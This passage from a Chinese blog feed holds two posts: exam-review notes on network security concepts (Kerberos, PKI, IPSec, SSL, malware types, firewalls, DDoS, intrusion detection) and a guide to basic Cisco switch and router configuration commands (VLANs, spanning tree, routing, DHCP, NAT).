color=orange>设计Kerberos是为了解决哪些问题？</font></p></li><li><p>Kerberos的设计目的就是解决分布式网络环境下用户访问网络资源时的安全问题，即工作站的用户希望获得服务器上的服务、服务器能够对服务请求进行认证，并能限制授权用户的访问</p></li><li><p><font color=orange>在Kerberos中，什么是门票？什么是门票分发门票？</font></p><ul><li>用户需要访问远程服务或资源，其工作站代替用户向KDC提出申请。KDC为双方生成一个共享密钥，并分别用用户和远程服务的主密钥加密这个会话密钥，再将这些信息发送给工作站。该消息包括用远程资源或服务的主密钥加密的会话密钥，以及用户的名字等信息。这部分信息称为访问远程资源的门票**<del>（这部分内容来自课件）</del>**</li><li>工作站向KDC申请会话密钥，KDC生成会话密钥，并发送一个门票分发门票(TGT)给工作站，TGT包括用KDC的主密钥加密的会话密钥，还包括用户名字和会话密钥过期时间等。</li></ul></li><li><p><font color=orange>简述Kerberos用户中用户工作站获得会话秘钥和TTG的过程以及获得服务授权门票的过程</font></p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/获得会话秘钥与TGT.png" style="zoom: 50%;" /><p><strong><font color=orange>获取服务授权门票见课本P89</font></strong></p></li><li><p>什么是证书，证书的基本功能是什么？</p><ul><li>证书就是一种经过签名的消息，用来确定某个名字和某个公钥的绑定关系</li></ul></li><li><p>简述X.509双向认证过程</p><ul><li><p style="color:blue;">课本100页大段,因为存在大段公式推荐看课本</p></li></ul></li><li><p>一个完整的PKI应用系统包括哪些组成成分？各自具有什么功能？</p><ul><li>一个完整的PKI应用系统必须包括：权威认证机构（CA）、数字证书库、秘钥备份及恢复系统、证书作废系统、应用接口（API）等基本构成部分<ul><li>权威认证机构（CA）：是PKI的核心执行机构，是数字证书生成、发放的运行实体，一般情况下也是证书撤销列表(CRL)的发布点</li><li>数字证书库：证书库是CA颁发证书和撤销证书的集中存放地，可以供公众进行开放式查询</li><li>秘钥备份及恢复系统：提供备份与恢复秘钥的机制</li><li>证书作废系统：</li><li>应用接口（API）：提供良好的应用接口系统使得各个的应用程序能够以安全、一致可信的方式与PKI交互</li></ul></li></ul></li></ul><h3 id="第五章-Internet安全"><a href="#第五章-Internet安全" class="headerlink" title="第五章 Internet安全"></a>第五章 Internet安全</h3><h4 id="思考题-2"><a href="#思考题-2" class="headerlink" title="思考题"></a>思考题</h4><ul><li><p><strong><font color=skyblue>IPSec提供哪些服务？（考察）</font></strong></p><p style="color:blue;">IPSec将密码技术应用在网络层，提供端对端通信数据的私有性、完整性、真实性、防重放攻击等安全服务</p></li><li><p><strong><font color=skyblue>什么是SA？SA由哪些参数来表示？（考察）</font></strong></p><ul><li><p>安全关联(SA)是IP的认证和保密机制中的核心概念，一个安全关联是发送方和接收方之间受到密码技术保护的单向关系，该关系对所携带的通信流量提供安全服务</p></li><li><p style="color:blue;">一个安全关联由3个参数确定：安全参数索引(SPI)。目标IP地址、安全协议表示</p></li></ul></li><li><p><strong><font color=skyblue>传输模式和隧道模式有何区别？（考察）</font></strong></p><ul><li>从安全性来讲，隧道模式优于传输模式。它可以完全地对原始IP数据报进行验证和加密。隧道模式下可以隐藏内部IP地址，协议类型和端口</li><li>从性能来讲，隧道模式因为有一个额外的IP头，所以它将比传输模式占用更多带宽</li><li>从场景来讲，传输模式主要应用于两台主机或一台主机和一台VPN网关之间通信；隧道模式主要应用于两台VPN网关之间或一台主机与一台VPN网关之间的通信。</li><li>当安全协议同时采用AH和ESP时，AH和ESP协议必须采用相同的封装模式。 </li></ul></li><li><p><strong><font color=skyblue>AH协议和ESP协议各自提供哪些安全服务？（考察）</font></strong></p><ul><li>IP认证头(AH)协议为IP数据包提供数据完整性校验和身份认证，还有可选择的抗重放攻击保护，但不提供数据加密服务</li><li>封装安全载荷(ESP) 协议为IP数据包提供数据完整性校验、身份认证和数据加密，还有可选择的抗重放攻击保护</li></ul></li><li><p><strong><font color=red>SSL由哪些协议组成？各自完成什么功能？（掌握 大题）</font></strong></p><ul><li>SSL不是单个的协议，而是两层协议<ul><li>SSL记录协议基于可靠的传输层协议，用来封装高层协议</li><li>高层协议主要包括SSL握手协议、修改密码参数协议、报警协议、应用数据协议（如HTTP）等</li></ul></li><li>SSL协议的功能：<ul><li>SSL记录协议：为高层协议提供基本的安全服务：保密和消息完整性</li><li>SSL握手协议：握手协议在SSL记录层之上，负责建立当前会话状态的参数</li><li>SSL修改密码规程协议：该消息将改变连接所使用的加密规约</li><li>告警协议：规定了告警的级别和告警的类型，在SSL协议执行过程中通过告警协议来显示信息交换过程中所发生的错误</li></ul></li></ul></li><li><p><strong><font color=red>描述SSL协议的基本流程。（掌握 大题）</font></strong></p><ul><li>在基本流程中，客户端A发起与服务器B的链接，然后B把自己的证书发送给A。A验证B的证书，从中提取B的公钥,然后选择一个用来计算会话秘钥的随机数，将其用B的公钥加密发送给B。基于这个随机数，双方计算出会话密钥(主秘钥)。然后通信双方使用会话秘钥对会话数据进行加密和完整性保护</li><li>P122页还有其他内容…….</li></ul></li><li><p><strong>发送时，SSL记录协议都执行了哪些操作？分别完成什么功能？</strong></p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/SSL记录协议.png" style="zoom:50%;" /><ul><li>从上层接收要发送的数据，对信息进行分段，成若干记录，使用指定的压缩算法进行数据压缩数据（可选）；使用指定的MAC算法生成MAC；使用指定的加密算法进行数据加密；发送数据</li></ul></li><li><p><strong>简述SSL握手协议的流程。</strong></p><ul><li><p>第一阶段 安全能力的建立</p><blockquote><p>(1) 客户 → 服务器 ：client_hello                        (2) 服务器 → 客户 ：server_hello</p></blockquote></li><li><p>第二阶段 服务器认证和密钥交换</p><blockquote><p>(3) 服务器 → 客户 ：server_certificate             (4) 服务器 → 客户 ：server_key_exchange<br>(5) 服务器 → 客户 ：certificate_request           (6) 服务器 → 客户 ：server_hello_done</p></blockquote></li><li><p>第三阶段  客户认证和密钥交换</p><pre class="line-numbers language-none"><code class="language-none">(7) 客户 → 服务器 ：client_certificate(8) 客户 → 服务器 ：client_key_exchange(9) 客户 → 服务器 ：certificate_verify<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>第四阶段  结束阶段</p><pre class="line-numbers language-none"><code class="language-none">(10) 客户 → 服务器 ：change_cipher_spec(11) 客户 → 服务器 ：finished(12) 服务器 → 客户 ：change_cipher_spec(13) 服务器 → 客户 ：finished<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h3 id="第六章-恶意代码"><a href="#第六章-恶意代码" class="headerlink" title="第六章 恶意代码"></a>第六章 恶意代码</h3><h4 id="思考题-3"><a href="#思考题-3" class="headerlink" title="思考题"></a>思考题</h4><ul><li><strong>什么是恶意代码？主要包括哪些类型？</strong><ul><li>经过存储介质和计算机网络进行传播，从一台计算机系统到另外一台计算机系统，未经授权而破坏计算机系统安全性和完整性的程序或代码</li><li>恶意代码包括：计算机病毒、木马、蠕虫、逻辑炸弹、脚本病毒、用户级RootKit、核心级RootKitd等</li></ul></li><li><strong><font color=red>计算机病毒的概念及特征是什么？ （大题或小题）</font></strong><ul><li>计算机病毒是一种人为编制的、能够对计算机正常程序的执行或数据文件造成破坏，并且能够自我复制的一组指令程序代码</li><li>其特性包括：破坏性、传染性、隐蔽性、潜伏性、多态性、不可预见性</li></ul></li><li><strong><font color=red>什么是木马？木马和病毒有哪些主要区别？</font></strong><ul><li>木马是有隐藏性的、可与远程计算机建立连接，使远程计算机能够通过网络控制本地计算机的恶意程序。 </li><li>病毒与木马的区别<ul><li>木马通常不像传统病毒那样感染文件。木马一般是以寻找后面、窃取密码和重要文件为主，还可以对计算机进行跟踪监视、控制、查看、修改资料等操作，具有很强的屏蔽性、突发性与攻击性。</li><li>传统的文件型病毒寄生于正常可执行程序体内，通过寄主程序的执行而执行，大多数木马程序都有一个独立的可执行文件</li></ul></li></ul></li><li><strong><font color=red>什么是蠕虫？蠕虫有哪些技术特性？</font></strong><ul><li>蠕虫是一种结合黑客技术和计算机病毒技术，利用系统漏洞和应用软件的漏洞，通过复制自身进行传播的、完全独立的程序代码。</li><li>蠕虫病毒具有的技术特性有：跨平台、多种攻击手段、极快的传播速度、多态性、可变形性、传输载体与零时间探测利用等特性</li></ul></li></ul><h3 id="第七章-防火墙"><a href="#第七章-防火墙" class="headerlink" title="第七章 防火墙"></a>第七章 防火墙</h3><h4 id="思考题-4"><a href="#思考题-4" class="headerlink" title="思考题"></a>思考题</h4><ul><li><strong>什么是防火墙？它有哪些功能和局限性？</strong><ul><li><del>防火墙是一个由软件和硬件组合而成的、起过滤和封锁作用的计算机或网络系统，一般部署在本地网络和外部网络之间</del>（P175定义 老师说不是这个）</li><li>防火墙是一种建立在被认为是安全可信的内部网和和被认为不太安全可信的外部网之间的访问控制机制，是安全策略的具体体现（P176 定义）</li><li>还包括屏蔽主机防火墙（单堡垒主机）、屏蔽主机防火墙（双宿堡垒主机防火墙）、屏蔽子网防火墙等</li><li>防火墙的作用是隔离风险区域和安全区域的连接，阻止不希望的或者未授权的通信进入内部网，通过边界控制强化内部网的安全，同时不会妨碍内部网对外部网的访问</li><li>防火墙的功能：访问控制功能、内容控制功能、日志功能、集中管理功能、自身安全和可用性<ul><li>访问控制功能</li><li>内容控制功能</li><li>日志功能</li><li>集中管理功能</li><li>自身安全和可用性</li></ul></li><li>防火墙的局限性<ul><li>防火墙不能防御不经由防火墙的攻击</li><li>防火墙不能防范来自内部的威胁</li><li>防火墙不能防止病毒感染的程序和文件进出内部网</li><li>防火墙不能防止数据驱动式的攻击</li></ul></li></ul></li><li><strong><font color=red>简述包过滤原理</font></strong><ul><li>将IP数据报的各种包头信息与防火墙内建规则进行比较，然后根据过滤规则有选择地阻止或允许数据包通过防火墙。</li><li>这些过滤规则也称作访问控制表(access control table)。流入数据流到达防火墙后。</li><li>防火墙就检查数据流中每个IP数据报的各种包头信息。例如源地址、目的地址、源端口、目的端口、协议类型,来确定是否允许该数据包通过。一旦该包的信息匹配了某些特征,则防火墙根据其内建规则对包进行相应的操作，选择是否接收/丢弃 策略包</li></ul></li><li><strong>状态检查技术具有哪些特点？(小题)</strong><ul><li>对用户透明，能够在OSI/RM网络层上通过IP地址和端口号过滤进出的数据包</li><li>可以在OSI/RM应用层上检查数据包内容，查看这些内容是否符合安全规则</li><li>克服了包过滤技术和代理服务技术的局限性，能够根据协议、端口及源地址、目的地址的具体情况决定数据包是否通过</li><li>对于每个安全策略允许的请求，状态监测技术启动相应的进程，可快速的确认符合授权标准的数据包，使得运行速度加快</li></ul></li><li><strong><font color=red>简述屏蔽子网防火墙的结构</font></strong><ul><li>使用了两个包过滤路由器，一个在堡垒机和internet之间，称为外部屏蔽路由器，一个在堡垒主机和内部网络之间称为内部屏蔽路由器</li><li>每一个路由器都被配置为只和堡垒主机交换流量。外部路由器使用标准过滤来限制对堡垒主机的外部访问,内部路由器则拒绝不是堡垒主机发起的进人数据包,并只把外出数据包发给堡垒主机。</li></ul></li></ul><h3 id="第八章-网络攻击与防范"><a href="#第八章-网络攻击与防范" class="headerlink" title="第八章 网络攻击与防范"></a>第八章 网络攻击与防范</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 本章考点如下</span><span class="token operator">-</span> Dos与DDos 简答题<span class="token operator">-</span> 在入侵检测上同时存在大题和小题<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="思考题-5"><a href="#思考题-5" class="headerlink" title="思考题"></a>思考题</h4><ul><li><strong><font color=red>简述网络攻击的过程？（掌握）</font></strong><ul><li>网络攻击的过程可以归纳为：隐藏自身，踩点与扫描，侵入系统并提升权限，种植后门，网络隐身五个步骤<ul><li><strong>1 隐藏自身：</strong></li><li><strong>2 踩点与扫描：</strong></li><li><strong>3 侵入系统并提升权限</strong></li><li><strong>4 种植后门：</strong></li><li><strong>5 网络隐身：</strong>在成功侵入目标主机并植入后门后需要清除登录日志及其他相关日志</li></ul></li></ul></li><li><strong>在整个DDos攻击过程中都有哪些角色？分别完成什么功能？</strong><ul><li>DDos攻击过程中涉及四种主机：攻击者，主控傀儡机，攻击傀儡机，被攻击者<ul><li>攻击者：发布实施DDos的指令，是整个DDos攻击中的主控平台</li><li>主控傀儡机：通过这些主机分别控制大量的攻击傀儡机，能够接收攻击者发来的特殊指令，而且可以把这些指令发送到攻击傀儡机上</li><li>攻击傀儡机： 攻击傀儡机是攻击的直接执行者，直接向被攻击主机发起攻击</li><li>被攻击者：是DDos攻击的直接受害者，目前多为一些大型企业的网络和数据库系统</li></ul></li></ul></li><li><strong><font color=red>简述僵尸网络的工作原理？（掌握 大题）</font></strong><ul><li>僵尸网络的概念：僵尸网络是攻击者处于恶意目的，融合传统的恶意软件，如计算机病毒，蠕虫和木马等技术，传播僵尸程序感染大量主机，并通过一对多的命令与控制信道被感染的主机所组成的叠加网络。<ul><li>僵尸网络利用其所控制的僵尸主机群发起攻击，其活动可以分为四个阶段<ol><li>感染目标主机构建僵尸网络</li><li>发布命令，控制僵尸程序</li><li>展开攻击</li><li>攻击善后，主要目的是隐藏攻击痕迹，防止被追踪溯源</li></ol></li></ul></li></ul></li><li><strong>什么是入侵检测？ 入侵检测的典型过程是什么？</strong><ul><li>入侵检测是指在计算机网络或计算机系统中若干关键点收集信息并对收集到的信息进行分析，从而判断是网络或系统中是否有违反安全策略的行为和被攻击的迹象。它是对入侵行为的发觉</li><li>入侵检测的典型过程是：信息收集、信息（数据）预处理，数据的检测分析，根据安全策略做出响应，有的还包括检测效果的评估</li></ul></li><li><strong>IDS的基本功能是什么？典型的IDS包括哪些实体？</strong><ul><li>入侵检测系统（IDS）是完成入侵检测的功能的软件、硬件的组合；是对敌对攻击在适当的时间内进行检测并做出响应的一种工具</li><li>典型的IDS包括事件生成器、事件分析器、事件数据库、响应单元、目录服务器<ul><li>事件生成器：事件生成器是采集和过滤事件数据的程序和模块，负责收集原始数据</li><li>事件分析器：事件分析器是分析事件数据和任何CIDF组件传送给他的各种数据。</li><li>事件数据库：负责存放各种数据原始数据或已加工过的数据</li><li>响应单元： 是针对分析组件所产生的分析结果，根据响应策略采取响应的行为，发出命令响应攻击</li><li>目录服务器： 用于各组件定位其他组件，以及控制其他组件传递的数据并认证其他组件的使用，以防止其他组件的使用，以防止入侵检测系统本身受到攻击。</li></ul></li></ul></li><li><strong>简述异常检测和误用检测的基本原理？</strong> <ul><li>异常检测原理： 任何一种入侵行为都由于其偏离正常或者所期望的系统和用户的活动规律而被检测出来</li><li>误用检测原理： 建立在对过去各种已知网络入侵方法和系统缺陷知识的积累之上。入侵检测系统中存储着一系列已知的入侵行为描述，当某个系统的调用与一个已知的入侵行为相匹配时，则认为是入侵行为</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;计算机网络安全思考题：&quot;&gt;&lt;a href=&quot;#计算机网络安全思考题：&quot; class=&quot;headerlink&quot; title=&quot;计算机网络安全思考题：&quot;&gt;&lt;/a&gt;计算机网络安全思考题：&lt;/h2&gt;&lt;h3 id=&quot;第一章概述&quot;&gt;&lt;a href=&quot;#第一章概述&quot; class</summary>
      
    
    
    
    <category term="网络安全" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="网络安全" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>网络工程——CISCO设备基本语法</title>
    <link href="https://shierjinghuang.github.io/2023/02/20/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
    <id>https://shierjinghuang.github.io/2023/02/20/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</id>
    <published>2023-02-20T14:13:23.000Z</published>
    <updated>2023-03-05T10:35:20.784Z</updated>
    
    <content type="html"><![CDATA[<h2 id="网络工程——CISCO设备基本语法"><a href="#网络工程——CISCO设备基本语法" class="headerlink" title="网络工程——CISCO设备基本语法"></a>网络工程——CISCO设备基本语法</h2><p>[TOC]</p><h3 id="交换机配置："><a href="#交换机配置：" class="headerlink" title="交换机配置："></a>交换机配置：</h3><pre class="line-numbers language-none"><code class="language-none">Switch&gt;enable进入特权模式Switch#configure terminal进入全局配置模式Switch(config)#hostname S1更改用户名S1(config)#enable password ciscoS1(config)#line con 0S1(config-line)#password ciscoS1(config-line)#loginS1(config-line)#line vty 0 15S1(config-line)#password ciscoS1(config-line)#loginS1(config-line)#exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="管理配置地址："><a href="#管理配置地址：" class="headerlink" title="管理配置地址："></a>管理配置地址：</h4><pre class="line-numbers language-none"><code class="language-none">S1(config)# interface Vlan 1进入vlan 1的接口配置模式S1(if-config)# ip address 192.168.1.2 255.255.255.0设置接口IP地址与子网掩码S1(if-config)# no shutdown开启端口S1(if-config)# exitS1(config)# ip default-gateway 192.168.1.1配置默认网关IP地址S1(config)# end  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>其他交换机操作：</strong></p><blockquote><p>S1# show running-config     查看当前设备配置 </p></blockquote><blockquote><p>S1# show flash     显示<em>flash</em>存储器信息以及存储器中的IOS映象文件 </p></blockquote><blockquote><p>S1# show version     显示系统硬件的配置 </p></blockquote><p><strong>交换机Vlan划分及信息备份</strong></p><pre class="line-numbers language-none"><code class="language-none">Switch_A#vlan database进入vlan数据库模式Switch_A(vlan)#vlan 20 name VLAN20 Switch_A#configure terminalSwitch_A(config)#interface f0&#x2F;20Switch_A(config-if)#switchport mode access将端口的工作模式改为accessSwitch_A(config-if)#switchport access vlan 20指定接口所属vlan<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>保存配置及IOS到TFTP</strong></p><blockquote><p>Copy starup-config(or running-config)  tftp<br>copy flash tftp</p></blockquote><h4 id="STP与RSTP"><a href="#STP与RSTP" class="headerlink" title="STP与RSTP"></a>STP与RSTP</h4><p><strong>查看生成树</strong></p><blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">Show spanning<span class="token operator">-</span>tree   <span class="token comment">#识别根桥、阻塞端口和转发端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><strong>配置快速生成树：</strong></p><blockquote><pre class="line-numbers language-none"><code class="language-none">Switch (config)# spanning-tree mode rapid-pvst  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><strong>可以通过什么方法查看交换机的生成树阻塞了那个端口？</strong></p><blockquote><p>可以通过Show spanning-tree指令查看</p></blockquote><ol><li>Disabled（禁用状态）：不转发数据帧，不学习MAC地址表，不参与生成树计算</li><li>Blocking（阻塞状态）；不转发数据帧，不学习MAC地址表，接收并处理BPDU，不发生BPDU</li><li>Listening（监听状态）：不转发数据帧，不学习MAC地址表，参与生成树计算，接收并发送BPDU</li><li>Learning（学习状态）：不转发数据帧，学习MAC地址表，参与生成树计算，接收并发送BPDU</li><li>Forwarling（转发状态）：转发数据帧，学习MAC地址表，参与生成树计算，接收并发送BPDU </li></ol><p><strong>总结生成树中根桥的选举规则</strong></p><ul><li>选择根桥的依据是网桥ID，网桥ID是唯一的，网桥ID由网桥优先级 和 网桥的MAC地址组成,网桥ID中的MAC地址是自身交换机的MAC地址</li><li>在选择根桥的时候，是依据看哪台交换机的ID值最小，优先级小的被选择为根网桥，在优先级相同的情况下，MAC地址小的为根网桥</li></ul><p><strong>更改根桥优先级</strong></p><p>所有交换机的优先级都是默认的32768，要实现变更根桥，只要将交换机的优先级更改为小于32768，同时优先级的修改以4096为增量</p><blockquote><p>在全局配置模式下执行如下命令∶spanning-tree vlan 1 priority 4096</p></blockquote><p>这样，Switch3的优先级值就变成4097，成为了网络中最小的ID，从而成为了根桥。</p><h4 id="三层交换实现VLAN间通信"><a href="#三层交换实现VLAN间通信" class="headerlink" title="三层交换实现VLAN间通信"></a>三层交换实现VLAN间通信</h4><p><strong>将端口分配给VLAN</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">config terminalinterface f0&#x2F;1switchport mode accessswitchport access vlan 10&#x2F;&#x2F;端口1分配给VLAN10exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>在交换机上给VLAN分配IP地址</strong></p><pre class="line-numbers language-none"><code class="language-none">Switch#config terminalInterface vlan 10Ip address 192.168.10.1 255.255.255.0&#x2F;&#x2F;VLAN10分配IP地址No shutdownExit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>三次交换机上为VLAN配置IP地址作用是什么？<ul><li><del><strong>vlan 上配IP就是真实的网关地址， 主要用于两台或者多台三层交换机之间进行通信</strong></del>（网络说法不一定可信）</li></ul></li><li>如何采用此种方法实现多个（超过两个）VLAN间路由？<ul><li>将二层交换机与三层交换机之间的接口设置为trunk模式，使得不同vlan可以经三层交换机实现路由</li></ul></li></ol><h3 id="路由器配置："><a href="#路由器配置：" class="headerlink" title="路由器配置："></a>路由器配置：</h3><h4 id="路由器常用命令"><a href="#路由器常用命令" class="headerlink" title="路由器常用命令"></a>路由器常用命令</h4><ul><li>Hostname    #设置交换机的主机名</li><li>Show startup-config    显示交换机初始化配置 </li><li>Show running-config    查看当前设备配置 </li><li>Show flash    显示<em>flash</em>存储器信息以及存储器中的IOS映象文件 </li><li>Show version    显示系统硬件的配置</li><li>Show interface **    命令来查察接口的信息</li><li>Show controllers **    查看接口的硬件信息 </li></ul><ol><li><p><strong>通过实验，说明如何保存路由器的启动配置 startup-config？</strong></p><blockquote><p style="color:blue;">Router# copy running-config startup-config</p></blockquote></li><li><p><strong>若将两台路由器互联，配置完各个接口的IP地址以后，两台PC是否可以ping通，为什么？在路由器上Ping另外一台路由器的互联接口是否可ping通，为什么？</strong> </p><blockquote><p style="color:blue;">不可以ping通，两台路由器之间缺少相应的路由，可以ping通，两个路由器端口直接相连。</p></blockquote></li></ol><p><strong>路由器的基本管理</strong></p><blockquote><p style="color:blue;">Router# copy running-config tftp    配置文件保存</p></blockquote><blockquote><p style="color:blue;">Router# Copy tftp running-config    配置文件恢复</p></blockquote><blockquote><p style="color:blue;">Router#copy flash tftp    保存操作系统</p></blockquote><p><strong>配置静态路由</strong></p><blockquote><p>ip route [目的网络号] [子网掩码] [下一跳IP地址]</p></blockquote><p><strong>配置默认路由：</strong></p><blockquote><p> ip route 0.0.0.0 0.0.0.0  [下一跳IP地址]</p></blockquote><ol><li><p><strong>静态路由的下一跳可以采用接口号表示，那么可以将本实验中的静态路由或默认路由写成什么表达形式？</strong></p><ul><li>可以将下一跳IP地址更换成出接口</li><li>静态路由：ip route [目的网络号] [子网掩码] [出接口]</li><li>默认路由：ip route 0.0.0.0 0.0.0.0  [出接口]</li></ul></li><li><p><strong>根据实验和路由知识，若静态路由和默认路由同时存在的话，分组路由的过程中优先选择静态路由还是默认路由？为什么？</strong></p><ul><li>静态路由。在路由表中默认路由排在最后，同时存在静态路由与默认路由时，将优先使用静态路由</li></ul></li></ol><p><strong>配置DHCP：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ip dhcp pool <span class="token punctuation">[</span>poolname<span class="token punctuation">]</span> <span class="token operator">//</span>创建地址池，名字为poolnamenetwork <span class="token number">1.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">255.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">//</span>配置分配的网段 default<span class="token operator">-</span>router <span class="token number">1.1</span><span class="token number">.1</span><span class="token number">.1</span>   <span class="token operator">//</span>配置网关dns<span class="token operator">-</span>server <span class="token number">219.218</span><span class="token number">.18</span><span class="token number">.18</span> <span class="token operator">//</span> 配置DNS服务器的IP地址。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>PC端如何使用命令行方式释放或获取新的IP地址？（ipconfig 参数）</p><blockquote><p>ipconfig /release释放本机IP地址</p><p>ipconfig /renew，获得一个新的IP地址</p></blockquote></li><li><p>若DHCP的配置中，使用的是Network 192.168.1.0 255.255.255.0，那么R1所连接本地网络中主机获取的IP地址范围是什么？</p><ul><li>192.168.1.1到192.168.1.254 <del>（应该）</del></li></ul></li><li><p>根据实验说明：主机获取的IP地址、子网掩码、网关和DNS分别与DHCP配置中那条命令对应？</p><ul><li>network命令配置主机获取的IP地址，子网掩码，default-router配置网关，dns-server配置DNS域名解析服务器。</li></ul></li></ol><p><strong>查看DHCP状态:</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">R1#show ip dhcp binding  &#x2F;&#x2F; 查看IP分配绑定状态R1#show ip dhcp pool [poolname]   &#x2F;&#x2F; 查看dhcp地址池R1#show ip dhcp server statistics &#x2F;&#x2F; 查看dhcp服务状态<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="二层交换机与路由器实现VLAN间路由"><a href="#二层交换机与路由器实现VLAN间路由" class="headerlink" title="二层交换机与路由器实现VLAN间路由"></a>二层交换机与路由器实现VLAN间路由</h4><p><strong>在交换机上创建Trunk端口</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">interface f0&#x2F;1                       &#x2F;&#x2F;与路由器级联接口为f0&#x2F;1switchport mode trunk       &#x2F;&#x2F;封装为Trunk口end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>配置路由器子接口</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Router#configure terminalInterface f0&#x2F;0No shutexitInterface f0&#x2F;0.10Encapsulation dot1q 10    &#x2F;&#x2F;子接口1对应VLAN 10Ip address 192.168.10.1 255.255.255.0Interface f0&#x2F;0.20Encapsulation dot1q 20Ip address 192.168.20.1 255.255.255.0    &#x2F;&#x2F;子接口2 对应VLAN 20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>激活路由选择协议</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Switch(config)#Ip routing<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p>使用这种方式配置VLAN间路由的原理是什么？</p><p> 路由器的一个接口上通过配置逻辑接口或子接口的方式，<code>实现原来相互隔离的不同VLAN（虚拟局域网）之间的互联互通</code> </p></li><li><p>如果不使用子接口，而是利用路由器的两个以太网口分别连接到交换机两个不同VLAN中的接口上（PC、交换机与路由器级联接口也划分入相应的VLAN），是否能够连通？在这种情况下，路由器与交换机之间的级联接口不配置Trunk是否可以连通？</p><ul><li>可以连通， 在路由器上为每一个VLAN都配置一个物理连接后，数据流将分不同VLAN流到路由器上不同的端口中，再通过路由器进行路由的转发，以实现VLAN之间的通信。 </li></ul></li></ol><h4 id="网络地址转换NAT"><a href="#网络地址转换NAT" class="headerlink" title="网络地址转换NAT"></a>网络地址转换NAT</h4><p><strong>静态NAT：</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">interface  f0&#x2F;0ip  adddress  172.16.1.1 255.255.255.0ip  nat  inside# 定义内部接口no shutdown(config)#interface   f0&#x2F;1ip  address  202.96.134.1 255.255.255.0ip  nat  outside# 定义外部接口no shutdown(config)#ip  nat  inside  source  static 172.16.1.100   202.96.134.100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p style="color:blue;">ip nat inside source static    [本地IP地址]     [目标ip地址] # 初始于 inside 向 outside 发送，在outside接口执行源地址翻译 </blockquote><blockquote><p style="color:blue;">ip nat outside source static [global-address] [local-address]， 初始于 outside 向 inside 发送，在inside接口执行源地址翻译 </blockquote><p><strong>动态NAT配置：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">10</span> permit <span class="token number">172.16</span><span class="token number">.1</span><span class="token number">.0</span> <span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.255</span><span class="token comment"># 创造一个访问控制列表（ACL）,表号为10，内容是允许172.16.1.0 </span><span class="token comment"># access-list [表号] [permit/deny] [网络号] [反掩码]</span>ip nat pool MYNAT <span class="token number">202.96</span><span class="token number">.134</span><span class="token number">.100</span> <span class="token number">202.96</span><span class="token number">.134</span><span class="token number">.110</span> netmask <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span><span class="token comment"># 配置NAT地址池的名字以及 IP地址范围、子网掩码</span>ip nat inside source <span class="token builtin">list</span> <span class="token number">10</span> pool MYNAT<span class="token comment"># 将ACL 10 匹配得内部源IP地址，转换为地址池MYNAT 中的IP</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p><strong>将静态路由换成默认路由改如何配置？如果从外网向内网私有IP发起通信，是否可以ping通？</strong></p><ul><li>不能ping通，静态NAT技术实现的就是对内部主机的隐藏</li></ul></li><li><p><strong>对第5步中：ip nat inside source list 10 pool MYNAT 